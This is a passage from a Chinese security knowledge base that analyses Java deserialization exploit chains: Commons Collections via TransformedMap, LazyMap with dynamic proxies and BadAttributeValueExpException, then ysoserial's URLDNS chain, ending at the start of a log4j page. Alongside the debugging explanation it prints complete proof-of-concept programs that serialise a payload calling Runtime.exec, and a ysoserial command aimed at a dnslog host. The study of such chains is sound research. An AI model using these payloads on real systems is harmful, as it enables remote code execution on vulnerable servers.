即Transformer实现类（如ChainedTransformer）分别绑定到Map的key和value上，当map的key或value被修改时，会调用对应Transformer实现类的transform()方法去进行一些变换操作。 为什么会这样？为什么put了就会触发transform方法？ 看一下TransformedMap.put这个方法，发现在put操作的时候，会直接调用类函数中的transformKey和transformValue去处理 然后这俩个类函数返回的是我们传入的Transformer实现类去执行transform方法 所以我们put了过后就触发了。 调用setValue触发同理；TransformedMap里的每个entryset在调用setValue方法时会自动调用TransformedMap类的checkSetValue方法 我们可以把chainedtransformer绑定到一个TransformedMap上，当此map的key或value发生改变时，就会自动触发chainedtransformer。 Map.Entry Map.Entry是Map的一个内部接口。 Map.Entry是Map声明的一个内部接口，此接口为泛型，定义为Entry。它表示Map中的一个实体（一个key-value对）。接口中有getKey()、getValue()方法。 反射exec 在Java中执行命令一般通过Runtime.getRuntime().exec(\"command\")来执行命令，如果我们想在修改transformedMap时执行命令，就需要构造一个特殊的ChainedTransformer来反射出exec函数。 反射利用链 分析ChainedTransformer中的transform方法可以发现，这个链中，会将上一次变换的结果作为下一次变换的输入，直到所有的变换完成，并返回最终的object 再分析InvokerTransformer中的transform方法可以发现，这地方就是通过给定的object，然后通过.getClass、.getMethod、.invoke的方法进行反射，达到调用指定方法的目的。 所以我们构造的ChainedTransformer的链中，最终的执行应该是类似于： ((Runtime)Runtime.class.getMethod(\"getRuntime\").invoke(Runtime.class)).exec(\"open -na Calculator\"); 因此链的第一步，就是获取Runtime的类，可以通过内置的ConstantTransformer来获取 这时链就变成了 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class) }; Transformer transformerChain = new ChainedTransformer(transformers); 第二步就是通过InvokerTransformer来反射调用getMethod方法，参数是getRuntime，以此来获取到Runtime.class.getMethod(\"getRuntime\")，上面也提过，InvokerTransformer共接受3个参数 第⼀个参数是待执⾏的⽅法名，此处则为getMethod 第⼆个参数是这个函数的参数列表的参数类型，查看getMethod方法的定义，第一个参数是字符串String，第二个参数是Class，代表第二个参数是可变类参数，所以这里是Class[].class，所以此处应写为new Class[] {String.class, Class[].class} 第三个参数是传给这个函数的参数列表，为调用getMethod时候实际传入的参数（需要和第二步里面统一），即为new Object[]{\"getRuntime\", new Class[0]}（new Class[0]可以理解为占位符，如果给这个函数传入null的话，会直接抛出空指针异常；如果传入new Class[0]的话就不会抛异常。） 因此此时的链就变成了 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}) }; Transformer transformerChain = new ChainedTransformer(transformers); 然后用同样的方法构造出.invoke(Runtime.class))和.exec(\"open -na Calculator\")即可 再举一个构造InvokerTransformer的例子，.invoke(Runtime.class))吧 第一个参数方法名：invoke 第二个参数参数列表的参数类型：new Class[]{Object.class, Object[].class} 第三个参数就是传入的参数列表，此处是Runtime.class，写成：new Object[]{Runtime.class, new Object[0]} 最终的链 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"open -na Calculator\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); 链构造好了，只需要构造一个使用这个链的TransformedMap的对象，然后修改里面的内容即可触发命令执行了。 Map innerMap = new HashMap(); innerMap.put(\"1\", \"2\"); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\"3\", \"4\"); 效果 简化链 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"open -na Calculator\"}) }; 上⾯的命令执⾏只是一个demo，它只是⼀个⽤来在本地测试的类，是不能直接在目标上执行的。 在实际过程中，是需要结合反序列化漏洞，将上⾯最终⽣成的outerMap对象变成⼀个序列化流让目标进行反序列化，达到远程命令执行的目的。 使用AnnotationInvocationHandler触发反序列化 环境要求：JDK 1.7 下载地址，建议选JDK 7u21 分析 到目前为止，我们已经构造出了可以执行命令的恶意链。 到这一步，正常的代码审计过程中，会采取两种策略，一种是继续向上回溯，找transformKey、transformValue、checkSetValue这几个方法被调用的位置，另一种策略就是全局搜索readObject()方法，看看有没有哪个类直接就调用了这三个方法中的一个或者readObject中有可疑的操作，最后能够间接触发这几个方法。审计中，一般都会把两种策略都试一遍。 现在只要找到一个符合以下条件的类，并且服务端有反序列化的入口，就可以RCE了。 该可序列化的类重写了readObject方法； 该类在readObject方法中对Map类型的变量进行了键值修改操作，并且这个Map参数是可控的； 根据上面的条件，大佬们找到了rt.jar!/sun/reflect/annotation/AnnotationInvocationHandler.class这个类； 这个类有一个成员变量 memberValues是Map类型，并且在重写的 readObject() 方法中有 memberValue.setValue() 修改Value的操作。 注意这个必须要JDK7，JDK8是没有这个问题的 根据刚才的反射exec章节 核心的逻辑就是： 实例化一个AnnotationInvocationHandler类，将其成员变量memberValues赋值为精心构造的恶意TransformedMap对象。然后将其序列化，提交给未做安全检查的Java应用。Java应用在进行反序列化操作时，执行了readObject()函数，修改了Map的Value，则会触发TransformedMap的变换函数transform()，再通过反射链调用了Runtime.getRuntime.exec(\"XXX\") 命令，最终就可以执行我们的任意代码了。 POC构建过程 通过反射调用AnnotationInvocationHandler的构造函数，给构造的恶意链传进构造参数中，生成对象o； AnnotationInvocationHandler 构造函数 Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object o = constructor.newInstance(Retention.class, outerMap); // 暂时用Retention.class，后面会分析为啥 对对象o进行序列化 ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(o); objectOutputStream.close(); System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray())); 但是在writeObject的时候报了一个反序列化的错误： 主要原因是因为Runtime类是没有实现 java.io.Serializable 接⼝的，所以是不允许被序列化。 但是我们可以通过反射来获取到当前上下⽂中的Runtime对象，⽽不需要直接使⽤这个类（也就是我们最开始的POC示例中的Transformer[]）： Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"open -na Calculator\"}) }; 可以看到成功序列化了，但是反序列化后并没有触发计算器，也就是说并没有成功执行命令。 解决思路：触发需要满足以下两个条件： sun.reflect.annotation.AnnotationInvocationHandler构造函数的第⼀个参数必须是 Annotation的⼦类，且其中必须含有⾄少⼀个⽅法，假设⽅法名是X； 被TransformedMap.decorate修饰的Map中必须有⼀个键名为X的元素。 不懂为什么必须要这样，调试分析一下。 查看readObject代码，发现在setValue前有两个if语句 if (var7 != null) { Object var8 = var5.getValue(); if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) { var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + \"[\" + var8 + \"]\")).setMember((Method)var2.members().get(var6))); } } 先在 if (var7 != null)这下断点，然后调试，发现 var7 确实是 null，所以没有执行命令成功 分析一下，var7值是从var3.get(var6)获取来的 var3是一个map，键是我们构造AnnotationInvocationHandler对象传入的第一个对象（Retention.class）中的方法名（这里是value），而值就是这个方法return的类（这里是class java.lang.annotation.RetentionPolicy）。 var6则是我们创建innerMap时put的键值对中的键 放个图大概说明下： 所以只需要我们创建的innerMap中的键包含在var3的键中即可，也就是说innerMap中的键必须是AnnotationInvocationHandler构造函数的第一个参数（这里是Retention.class）对应类中的方法名value 构造innerMap像下图这样 再调一下，这个时候的var7满足不等于null了 然后看第二个if语句 需要满足条件： var7.isInstance(var8) ==> false // 满足第一个if条件后，var7就是innerMap中输入的键值对应Annotation子类方法返回的类型，也就是var3对应键的值 var8 instanceof ExceptionProxy ==> false // var8就是我们创建的innerMap中输入的键值对中的值 这个就比较简单，满足条件即可。 到这就比较清楚反序列化后面2个if语句的限制了，我们也可以用其他的Annotation的子类即可，举个例子： 随便找个Annotation子类 构建对象 // 构建对象 Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object o = constructor.newInstance(Action.class, outerMap); 查看Action.class的源码 使用方法input，返回类型是String，所以我们创建的innerMap的put的键值对中，键是input 由于var7.isInstance(var8) ==> false，所以我们innerMap的put的键值对中的值类型不能是String 所以构造如下： Map innerMap = new HashMap(); innerMap.put(\"input\", 1); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); 运行 成功反序列化执行了命令。 完整POC package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import javax.xml.ws.Action; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; import java.util.Arrays; import java.util.HashMap; import java.util.Map; public class App { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException { System.out.println(String.class.isInstance(\"\")); // 利用链 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"open -na Calculator\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); innerMap.put(\"input\", 1); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); // 构建对象 Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object o = constructor.newInstance(Action.class, outerMap); // 序列化 ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(o); objectOutputStream.close(); System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray())); // 反序列化 ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray())); objectInputStream.readObject(); } } 整体思路 我们构造恶意的AnnotationInvocationHandler类，将该类的成员变量memberValues赋值为我们精心构造的TransformedMap对象，并将AnnotationInvocationHandler类进行序列化，然后交给目标JAVA WEB应用进行反序列化。在进行反序列化时，会执行readObject()方法，该方法会对成员变量TransformedMap的Value值进行修改，该修改触发了TransformedMap实例化时传入的参数InvokerTransformer的transform()方法，InvokerTransformer.transform()方法通过反射链调用Runtime.getRuntime.exec(“xx”)函数来执行系统命令。 使用LazyMap利用链 介绍 LazyMap和TransformedMap类似，都继承 AbstractMapDecorator。 而TransformedMap是在写入元素的时候执行transform方法，LazyMap是在其get方法中执行的 this.factory.transform。 LazyMap的作用是“懒加载”，在get找不到值的时候，它会调用 this.factory.transform 方法去获取一个值 public Object get(Object key) { if (!super.map.containsKey(key)) { Object value = this.factory.transform(key); super.map.put(key, value); return value; } else { return super.map.get(key); } } 而this.factory也是我们可以控制的，在构造函数中。 protected LazyMap(Map map, Transformer factory) { super(map); if (factory == null) { throw new IllegalArgumentException(\"Factory must not be null\"); } else { this.factory = factory; } } 所以构造poc的时候只要令factory为精心构造的ChainedTransformer就行，因此我们找一下哪里可能调用了LazyMap的get方法。 但是我们在AnnotationInvocationHandler#readObject函数中并没有看到有执行get方法，所以ysoserial找到了另一条路，AnnotationInvocationHandler类的invoke方法有调用到get： AnnotationInvocationHandler#invoke看到invoke方向就大概联想到Java的动态代理机制。 动态代理复习 总结为一句话就是，被动态代理的对象调用任意方法都会通过对应的InvocationHandler的invoke方法触发 这里再举个例子说明一下如何自动调用的invoke方法 InvocationHandlerExample.class InvocationHandlerExample类继承了InvocationHandler，实现了invoke方法，作用是在监控到调用的方法名是get的时候，返回一个特殊字符串 Hacked Object 。 package org.example; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.util.Map; public class InvocationHandlerExample implements InvocationHandler { protected Map map; public InvocationHandlerExample(Map map){ this.map = map; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { if (method.getName().compareTo(\"get\") == 0){ System.out.println(\"HOOK Method: \" + method.getName()); return \"Hacked Object\"; } return method.invoke(this.map, args); } } App.class 在App类中调用这个InvocationHandlerExample package org.example; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class App { public static void main(String[] args) { InvocationHandler handler = new InvocationHandlerExample(new HashMap()); // 代理类的逻辑 Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler); proxyMap.put(\"1\", \"2\"); System.out.println(proxyMap.get(\"1\")); } } 可以看到调用的get方法，但是被我们动态代理中的invoke方法拦截了，返回了Hacked Object 也就是说这个Map对象经过动态代理处理之后，动态代理对象调用任何一个方法时会调用handler中的invoke方法。 我们回看sun.reflect.annotation.AnnotationInvocationHandler，会发现实际上这个类实际就是一个InvocationHandler，我们如果将这个对象用Proxy进行代理，那么在readObject的时候，只要调用任意方法，就会进入到AnnotationInvocationHandler#invoke方法中，进而触发我们的LazyMap#get。 所以我们只要创建一个LazyMap的动态代理，然后再用动态代理调用LazyMap的某个方法就行了，但是为了反序列化的时候自动触发，我们应该找的是某个重写了readObject方法的类，这个类的readObject方法中可以通过动态代理调用LazyMap的某个方法，其实这和直接调用LazyMap某个方法需要满足的条件几乎是一样的，因为某个类的动态代理与它本身实现了同一个接口。而我们通过分析TransformedMap利用链的时候，已经知道了在AnnotationInvocationHandler的readObject方法中会调用某个Map类型对象的entrySet()方法，而LazyMap以及他的动态代理都是Map类型，所以，一条利用链就这么出来了 构建POC 对sun.reflect.annotation.AnnotationInvocationHandler对象进行Proxy // 构建对象 Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); // 创建LazyMap的handler实例 InvocationHandler handler = (InvocationHandler) constructor.newInstance(Action.class, outerMap); // 创建LazyMap的动态代理实例 Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); // 动态代理对象，执行任意方法，都会到invoke中去 代理后的对象叫做proxyMap，但我们不能直接对其进行序列化，因为我们入口点是 sun.reflect.annotation.AnnotationInvocationHandler#readObject，所以我们还需要再用AnnotationInvocationHandler对这个proxyMap进行包裹（我们需要的是AnnotationInvocationHandler这个类的对象） // 创建一个AnnotationInvocationHandler实例，并且把刚刚创建的代理赋值给this.memberValues handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap); // readObject的时候主动调用proxyMap的方法进入到invoke中 完整POC package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.map.TransformedMap; import javax.xml.ws.Action; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Proxy; import java.util.Arrays; import java.util.HashMap; import java.util.Map; public class App { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException { System.out.println(String.class.isInstance(\"\")); // 利用链 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"open -na Calculator\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); innerMap.put(\"input\", 1); Map outerMap = LazyMap.decorate(innerMap, transformerChain); // 构建对象 Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(Action.class, outerMap); Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); // 代理对象 handler = (InvocationHandler) constructor.newInstance(Action.class, proxyMap); // 包裹 // 序列化 ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(handler); objectOutputStream.close(); System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray())); // 反序列化 ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray())); objectInputStream.readObject(); } } LazyMap利用链补充 上面的利用链受限于jdk1.7版本，我们来看一看另外一种利用方式，这条利用链不是用动态代理的方式触发了 从上一条利用链我们已经知道LazyMap类的get方法中调用了transform方法，那么除了AnnotationInvocationHandler的invoke方法中调用了get方法外，还有没有其他的地方也调用了get方法呢?当然有，TiedMapEntry类的getValue方法也调用了get方法 而且this.map我们也可以控制，但是我们最终要找的还是readObject方法中的触发点，所以继续网上找，看看哪里调用了TiedMapEntry的getValue方法，找到TiedMapEntry类的toString方法： public String toString() { return this.getKey() + \"=\" + this.getValue(); } toString方法在进行字符串拼接或者手动把某个类转换为字符串的时候会被调用，所以，现在我们找找把TiedMapEntry的对象当做字符串处理的地方，找到了BadAttributeValueExpException的readObject方法中有相关调用： 可以看到第三个if分支里调用了valObj.toString(),而valObj=gf.get(\"val\", null),这里其实就是读取传过来对象的val属性值，所以，只要我们控制BadAttributeValueExpException对象的val属性的值为我们精心构造的TiedMapEntry对象就行。所以，就有了下面的poc: package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.BadAttributeValueExpException; import javax.xml.ws.Action; import java.io.*; import java.lang.reflect.*; import java.util.Arrays; import java.util.HashMap; import java.util.Map; public class App { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException, NoSuchFieldException { System.out.println(String.class.isInstance(\"\")); // 利用链 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"open -na Calculator\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); innerMap.put(\"123\", 1); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); // 将lazyMap封装到TiedMapEntry中 TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, \"456\"); // 通过反射给badAttributeValueExpException的val属性赋值 BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null); Field val = badAttributeValueExpException.getClass().getDeclaredField(\"val\"); val.setAccessible(true); val.set(badAttributeValueExpException, tiedMapEntry); // 序列化 ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(badAttributeValueExpException); objectOutputStream.close(); System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray())); // 模拟目标进行反序列化 ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray())); objectInputStream.readObject(); } } 参考 Apache-Commons-Collections反序列化漏洞分析 Java安全之Commons Collections1分析前置知识 Java安全学习之ysoserial CommonsCollections1详细分析 java-cc1-反序列化简单分析 JAVA反序列化 - Commons-Collections组件 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:52:00 "},"个人知识库/02.代码审计/01.Java安全/2.各种分析/02.URLDNS链分析.html":{"url":"个人知识库/02.代码审计/01.Java安全/2.各种分析/02.URLDNS链分析.html","title":"02.URLDNS链分析","keywords":"","body":" URLDNS链利用 动态调试ysoserial URLDNS链分析 思考 总结 URLDNS链利用 先来看看用ysoserial工具怎么利用的。 # 生成序列化Payload java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://urldns.epraqr.dnslog.cn/ > a.ser 然后将序列化payload发给对应的目标结合漏洞让他进行反序列化，这里本地直接写个反序列化过程举例了； package org.example; import java.io.FileInputStream; import java.io.IOException; import java.io.ObjectInputStream; public class App { public static void main(String[] args) throws IOException, ClassNotFoundException { ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(\"/Users/d4m1ts/d4m1ts/tools/java/ysoserial/target/a.ser\")); objectInputStream.readObject(); } } DNSLog成功收到了请求 动态调试ysoserial 简而言之，就是给ysoserial项目加载到idea中，方便我们分析调试。 下载ysoserial项目后，导入到idea中，解决掉依赖问题 有的依赖一直装不上，可以新建个maven项目，然后再给不能下载的依赖放到pom.xml，下载后说不定可以解决。 实在不行就手动下载jar然后导入吧 idea会自动识别ysoserial的主类ysoserial.GeneratePayload，然后直接运行项目即可；我们也可以通过pom.xml文件的mainClass属性看到主类，如果正常显示ysoserial的用法，就说明项目部署成功了。 因为ysoserial生成payload需要传入参数，所以我们手动配置一下项目，传入参数 Run --> Edit Configurations... 然后在Program arguments输入对应的参数 再次运行 生成了序列化数据，说明一切运行成功，就可以用idea开始动态调试了。 URLDNS链分析 URLDNS是ysoserial里面就简单的一条利用链，但URLDNS的利用效果是只能触发一次dns请求，而不能去执行命令。比较适用于漏洞验证这一块，尤其是无回显的命令执行，而且URLDNS这条利用链并不依赖于第三方的类，而是JDK中内置的一些类和方法。 打开ysoserial/payloads/URLDNS.java的源码，可以看到它的调用链 * Gadget Chain: * HashMap.readObject() * HashMap.putVal() * HashMap.hash() * URL.hashCode() 这样看还是有点不特别明白，调试分析看看。 模拟对序列化后的ser文件进行反序列化处理，然后分析整个过程，反序列化代码如下（第一节中的反序列化代码）： 根据上述的Gadget Chain，可见触发点是在HashMap.readObject()，为了节约时间，我们直接在HashMap.readObject()处下断点。 运行主程序开始反序列化，自动在我们下断点的地方暂停。 然后一直F8 根据Gadget Chain发现使用了putVal方法，但这不是重点，重点是会调用hash方法 跟进hash方法 如果key不是null就会调用key.hashCode方法，跟进hashCode方法，这里调用的是URL类中的hashCode方法 当hashCode属性不为-1时就直接return，就不会触发hashCode方法，也就不会触发接下来的DNS解析 这里hashCode值默认为 -1，所以会执行 handler.hashCode(this); URLDNS链中也通过反射将hashCode的值设置为-1 跟一下handler，看看是什么玩意儿 是URLStreamHandler类（也是我们传入的handler），也就是说这里调用的是URLStreamHandler.hashCode 跟进hashCode方法，发现会调用getHostAddress方法对传入的URL对象进行解析 跟进getHostAddress方法，发现会调用getHost方法，然后调用InetAddress.getByName(host)发起DNS请求，至此整个过程完毕。 思考 分析过程中，发现HashMap.put方法中也调用了hash方法，然后去进行hashCode计算等。 那么就是说，在put操作的时候，也会触发对应的dns解析，试试看。 package org.example; import java.net.MalformedURLException; import java.net.URL; import java.util.HashMap; public class App { public static void main(String[] args) throws MalformedURLException { HashMap map = new HashMap(); URL url = new URL(\"http://cgu44y.dnslog.cn/\"); map.put(url, 2); } } 成功获取到了DNS解析请求记录。 那么为什么ysoserial在生成序列化数据的时候，也调用了put方法，但是没有收到DNS解析记录呢？ 原因就在于继承抽象类URLStreamHandler的SilentURLStreamHandler类中，重写了openConnection和getHostAddress 因此在调用 put 方法的时候不会触发 dns 查询。 进行尝试重写了openConnection和getHostAddress，发现确实不能收到dns查询记录。 package org.example; import java.io.IOException; import java.net.*; import java.util.HashMap; public class App { public static void main(String[] args) throws MalformedURLException { URLStreamHandler urlStreamHandler = new URLStreamHandler() { @Override protected URLConnection openConnection(URL u) throws IOException { return null; } @Override protected synchronized InetAddress getHostAddress(URL u){ return null; } }; HashMap map = new HashMap(); URL url = new URL(null, \"http://qyd9tm.dnslog.cn/\", urlStreamHandler); map.put(url, 2); } } 那这样我们反序列化的时候不是也因为重写了方法而不能进行 dns 查询吗？ 原因在于 URL 里面的 handler 设置的是 transient 我们都知道一个对象只要实现了Serilizable接口，这个对象就可以被序列化，java的这种序列化模式为开发者提供了很多便利，我们可以不必关系具体序列化的过程，只要这个类实现了Serilizable接口，这个类的所有属性和方法都会自动序列化。 然而在实际开发过程中，我们常常会遇到这样的问题，这个类的有些属性需要序列化，而其他属性不需要被序列化，打个比方，如果一个用户有一些敏感信息（如密码，银行卡号等），为了安全起见，不希望在网络操作（主要涉及到序列化操作，本地序列化缓存也适用）中被传输，这些信息对应的变量就可以加上transient关键字。 也就是说transient修饰符无法被序列化，所以虽然它最后是没执行dns请求，但是在反序列化的时候还是会执行dns请求 测试一下transient package org.example; import java.io.*; import java.util.Arrays; public class App { public static void main(String[] args) throws IOException, ClassNotFoundException { Test test = new Test(); // 设置值 test.test = \"Test Value\"; System.out.println(test.test); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(test); System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray())); // 反序列化 ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); Test serTest = (Test) objectInputStream.readObject(); System.out.println(serTest.test); } } class Test implements Serializable { transient public String test; } 可见反序列化后的值为null，说明序列化时并没有将test对应的值代入进去。 总结 这条链还是比较简单的，主要是反序列化过程中HashMap的Key会进行Key.HashCode()计算，如果Key传入的是URL(URL context, String spec, URLStreamHandler handler)类型（重写URLStreamHandler避免有多余的DNS请求），在计算hashCode()的时候，就会调用URLStreamHandler.hashCode()触发getHost方法对目标进行DNS解析。 举个例子： package org.example; import java.io.IOException; import java.net.MalformedURLException; import java.net.URL; import java.net.URLConnection; import java.net.URLStreamHandler; public class App { public static void main(String[] args) throws MalformedURLException { /* * `URL(URL context, String spec, URLStreamHandler handler)`类型，在计算`hashCode()`的时候，就会调用`URLStreamHandler.hashCode()`触发`getHost`方法对目标进行DNS解析 * */ URLStreamHandler handler = new URLStreamHandler() { @Override protected URLConnection openConnection(URL u) throws IOException { return null; } }; URL url = new URL(null, \"http://k0e09d.dnslog.cn/\", handler); url.hashCode(); // 触发点 } } 整个调用链如下： HashMap.readObject() -> HashMap.putVal() -> HashMap.hash() -> URL.hashCode() -> URLStreamHandler.hashCode().getHostAddress() -> URLStreamHandler.getHostAddress().InetAddress.getByName() URLDNS 这个利用链主要用来检测是否存在反序列化漏洞，有如下两个优点： 使用java 内部的类进行构造，不依赖第三方库 如果目标可以出网，在目标没有回显的时候，可以用来验证是否存在反序列化漏洞 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:52:00 "},"个人知识库/02.代码审计/01.Java安全/2.各种分析/03.log4j反序列化漏洞分析.html":{"url":"个人知识库/02.代码审计/01.Java安全/2.各种分析/03.log4j反序列化漏洞分析.html","title":"03.log4j反序列化漏洞分析","keywords":"","body":" 介绍 基础使用 pom.xml log4j2.xml Test.java CVE-2017-5645 简介 环境准备 直接复现 环境启动 漏洞复现 DEBUG分析 CVE-2019-17571 简介 环境准备 Debug分析 其他 介绍 https://logging.apache.org/log4j/2.x/ Log4j是Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。 简单来说，Log4j是一种非常流行的日志框架，最新版本是2.x；也是一个组件化设计的日志系统，它的架构大致如下： log.info(\"User signed in.\"); │ │ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ ├──>│ Appender │───>│ Filter │───>│ Layout │───>│ Console │ │ └──────────┘ └──────────┘ └──────────┘ └──────────┘ │ │ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ ├──>│ Appender │───>│ Filter │───>│ Layout │───>│ File │ │ └──────────┘ └──────────┘ └──────────┘ └──────────┘ │ │ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ └──>│ Appender │───>│ Filter │───>│ Layout │───>│ Socket │ └──────────┘ └──────────┘ └──────────┘ └──────────┘ 当我们使用Log4j输出一条日志时，Log4j自动通过不同的Appender把同一条日志输出到不同的目的地。例如： console：输出到屏幕； file：输出到文件； socket：通过网络输出到远程计算机； jdbc：输出到数据库 在输出日志的过程中，通过Filter来过滤哪些log需要被输出，哪些log不需要被输出。例如，仅输出ERROR级别的日志。 